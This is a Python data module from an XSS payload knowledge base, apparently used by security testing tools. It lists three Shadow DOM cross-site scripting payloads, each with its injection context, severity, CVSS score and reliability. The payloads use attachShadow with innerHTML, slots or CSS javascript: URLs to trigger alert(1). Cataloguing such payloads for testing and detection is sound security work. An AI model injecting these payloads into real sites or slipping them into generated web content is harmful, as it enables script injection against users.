#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Shadow DOM XSS Payloads
"""

from ..models import PayloadEntry


SHADOW_DOM_PAYLOADS = {
    "shadow_1": PayloadEntry(
        payload="<script>let s=document.body.attachShadow({mode:'open'});s.innerHTML='<img src=x onerror=alert(1)>'</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Shadow DOM innerHTML XSS",
        tags=["shadow-dom", "innerHTML"],
        reliability="high",
    ),
    "shadow_2": PayloadEntry(
        payload="<div id=h></div><script>h.attachShadow({mode:'open'}).innerHTML='<slot name=\"x\"></slot>';h.innerHTML='<img slot=x src=x onerror=alert(1)>'</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Shadow DOM slot XSS",
        tags=["shadow-dom", "slot"],
        reliability="high",
    ),
    "shadow_3": PayloadEntry(
        payload="<script>let s=document.body.attachShadow({mode:'closed'});s.innerHTML='<style>:host{background:url(javascript:alert(1))}</style>'</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.0,
        description="Closed Shadow DOM with CSS XSS",
        tags=["shadow-dom", "closed", "css"],
        reliability="low",
    ),
}

SHADOW_DOM_PAYLOADS_TOTAL = len(SHADOW_DOM_PAYLOADS)
